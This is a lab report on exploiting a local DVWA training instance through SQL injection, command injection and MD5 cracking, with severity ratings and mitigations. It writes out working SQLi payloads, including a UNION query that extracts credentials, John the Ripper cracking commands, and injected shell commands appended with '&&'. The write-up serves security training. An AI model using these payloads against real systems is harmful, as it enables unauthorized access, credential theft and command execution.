# Lab Report — Accessing Admin Panel (DVWA)

**Author:** [Matthew Chidiebere Chukwuorji]  
**Date:** 2025-09-12  
**Target:** DVWA (Damn Vulnerable Web Application) running locally on Kali (`http://127.0.0.1/dvwa`)  
**Scope:** Local lab / authorized testing only

---

## 1. Objective
Demonstrate exploitation techniques (SQL Injection and Command Injection) on a controlled DVWA instance to access the admin panel, extract credentials, and demonstrate remote command execution as the web user.

---

## 2. Environment
- Host OS: Kali Linux (local VM)  
- Application: DVWA (installed at `/var/www/html/dvwa`)  
- Services: Apache2, MySQL  
- DVWA Security level: **Low**

---

## 3. Vulnerabilities Identified
1. **SQL Injection — Authentication & Data Exfiltration (High)**  
   - Unsanitized input allowed injection and `UNION` queries to enumerate and exfiltrate data from the `users` table.

2. **Command Injection — Remote Command Execution (High)**  
   - The ping/host input was passed to a shell enabling arbitrary command execution as the web server user.

3. **Weak Password Storage — MD5 (High)**  
   - Passwords were stored using MD5 which facilitated rapid cracking of extracted password hashes.

---

## 4. Steps Performed (reproducible)
> Ensure DVWA is running locally and Security = Low.

### A. Verify SQL Injection
1. DVWA → **SQL Injection** lab.  
2. Input: 1' OR '1'='1
3. Result: Multiple rows returned confirming SQL injection.

### B. Extract credentials via UNION
1. SQLi lab input: ' UNION SELECT user, password FROM users#
2. Result: Returned rows containing `user` and `password` (hashes or plaintext). Saved the hash to `hashes.txt`.

### C. Crack MD5 hashes
# save the hash 
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt

# crack with John (MD5)
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
sudo john --show --format=raw-md5 hashes.txt

### D. Command Injection Payloads
127.0.0.1 && uname -a       # show OS info
127.0.0.1 && id             # show effective user
127.0.0.1 && ls -la /var/www/html   # list webroot directory

## 5. Severity
1. SQL Injection: High (direct access to sensitive data and authentication bypass).
2. Command Injection: High (remote command execution).
3. MD5 password storage: High (practical to crack weak passwords).
4. Overall risk: High for a production system

## 6. Impact
1. Full disclosure of user credentials (including admin).
2. Unauthorized administrative access to web app (dashboard).
3. Potential data exfiltration, account takeover, and further lateral movement if host is not isolated.
4. Remote command execution as web user — may lead to privilege escalation depending on host configuration.
5. Business Impact:* *Severe* — potential data breach, regulatory fines, reputational damage, and financial loss if in production.
6. Availability:* *Medium* — attacker could delete data, deface pages, or cause service disruption.
7. Integrity:* *High* — attacker can modify or delete data, create or edit accounts, change app settings.
8. Confidentiality:* *High* — attacker can view protected/admin-only data. 

## 7. Mitigation & Recommendations

### Immediate

Harden deployment (remove test pages), keep DVWA off public networks, and enforce rate-limiting/account lockout.

Replace MD5-stored passwords and force resets if this were production.

### Developer / code changes

Use parameterized queries / prepared statements (no string concatenation).

Never pass raw user input to shell commands; use safe libraries/APIs and strict whitelists (e.g., IPv4 regex).

Migrate password storage to bcrypt/Argon2 with per-user salts and proper cost factor.

Ensure DB accounts are least-privilege.

### Operational

Deploy a WAF to detect/block SQLi/command injection patterns.

Enable logging, monitoring, and alerting for suspicious activity.

Schedule SAST/DAST scans and developer secure-coding training







